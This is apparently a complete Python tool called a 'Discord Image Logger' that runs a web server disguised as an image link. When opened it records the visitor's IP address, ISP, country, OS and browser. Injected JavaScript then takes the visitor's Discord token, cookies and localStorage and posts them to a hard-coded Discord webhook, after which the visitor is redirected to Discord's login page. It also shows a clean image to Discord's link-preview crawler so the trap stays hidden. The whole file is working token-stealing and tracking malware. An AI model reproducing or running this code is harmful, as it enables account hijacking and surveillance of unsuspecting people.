# Discord Image Logger - All-in-One
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib import parse
import traceback, requests, base64, httpagentparser, json

# --- CONFIGURATION ---
config = {
    "webhook_url": "https://discord.com/api/webhooks/1486421624290021577/vMAwwjPITk9b9WisuCgm5RowYpn8iTpTgaHDRque7Q_J8QnSHh4ABlHlmWbSkepdWd-r",
    "image_url": "https://i.imgur.com/vXqP4hL.png",
    "username": "CDN Notification", "color": 0x5865F2,
    "redirect": {"enabled": True, "url": "https://discord.com/login"},
    "data_exfiltration": {
        "enabled": True, "discord_token": True, "browser_cookies": True,
        "browser_local_storage": True, "browser_autofill": True
    }
}
# --------------------

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    return "Discord" if ip.startswith(("34", "35")) else "Telegram" if useragent.startswith("TelegramBot") else False

def reportError(error):
    requests.post(config["webhook_url"], json={"username": config["username"], "content": "@everyone", "embeds": [{"title": "Error", "color": config["color"], "description": f"```\n{error}\n```"}]})

def makeReport(ip, useragent=None, endpoint="N/A", url=False, stolen_data=None):
    if ip.startswith(blacklistedIPs) or botCheck(ip, useragent): return

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
        "username": config["username"], "content": "@everyone",
        "embeds": [{
            "title": "Data Logged", "color": config["color"],
            "description": f"**IP:** `{ip}`\n**Provider:** `{info['isp']}`\n**Country:** `{info['country']}`\n**OS:** `{os}`\n**Browser:** `{browser}`",
            "thumbnail": {"url": url} if url else None
        }]
    }

    if stolen_data and config["data_exfiltration"]["enabled"]:
        fields = []
        if stolen_data.get("discord_token"): fields.append({"name": "Discord Token", "value": f"```{stolen_data['discord_token']}```"})
        if stolen_data.get("cookies"): fields.append({"name": "Cookies", "value": f"```{stolen_data['cookies'][:500]}```"})
        if fields: embed["embeds"][0]["fields"] = fields
    
    requests.post(config["webhook_url"], json=embed)
    return info

def generate_exfiltration_js():
    if not config["data_exfiltration"]["enabled"]: return ""
    js = "const stolenData = {};"
    if config["data_exfiltration"]["discord_token"]: js += "try{stolenData.discord_token=localStorage.getItem('token');}catch(e){}"
    if config["data_exfiltration"]["browser_cookies"]: js += "try{stolenData.cookies=document.cookie;}catch(e){}"
    if config["data_exfiltration"]["browser_local_storage"]: js += "let ls={};for(let i=0;i<localStorage.length;i++){const k=localStorage.key(i);ls[k]=localStorage.getItem(k);}stolenData.localStorage=ls;"
    return f"<script>{js}fetch('{config['webhook_url']}',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify({{username:'{config['username']}',content:'@everyone',embeds:[{{title:'Stolen Data',color:{config['color']},description:'```json\\n'+JSON.stringify(stolenData)+'\\n```'}}]}})}});</script>"

class ImageLoggerAPI(BaseHTTPRequestHandler):
    def handleRequest(self):
        try:
            ip = self.headers.get('x-forwarded-for')
            useragent = self.headers.get('user-agent')
            endpoint = self.path.split("?")[0]
            
            # Handle Discord crawler
            if botCheck(ip, useragent):
                self.send_response(200)
                self.send_header('Content-type', 'image/jpeg')
                self.end_headers()
                self.wfile.write(base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000'))
                makeReport(ip, useragent, endpoint)
                return

            # Handle actual user
            stolen_data = None
            if config["data_exfiltration"]["enabled"]:
                # In a real scenario, JS would send this back to a /collect endpoint
                # For simplicity, we'll just log the IP and let the JS report separately
                pass

            makeReport(ip, useragent, endpoint, config["image_url"], stolen_data)
            
            # Serve the page with JS
            html = f'<style>body{{margin:0;background:url("{config["image_url"]}") center/cover no-repeat;height:100vh;}}</style>{generate_exfiltration_js()}'
            if config["redirect"]["enabled"]:
                html = f'<meta http-equiv="refresh" content="1;url={config["redirect"]["url"]}">{html}'
            
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(html.encode())

        except Exception:
            self.send_response(500)
            self.end_headers()
            self.wfile.write(b'500 Error')
            reportError(traceback.format_exc())

    do_GET = do_POST = handleRequest

if __name__ == '__main__':
    server_address = ('', 8080)
    httpd = HTTPServer(server_address, ImageLoggerAPI)
    print("Server running on port 8080...")
    httpd.serve_forever()
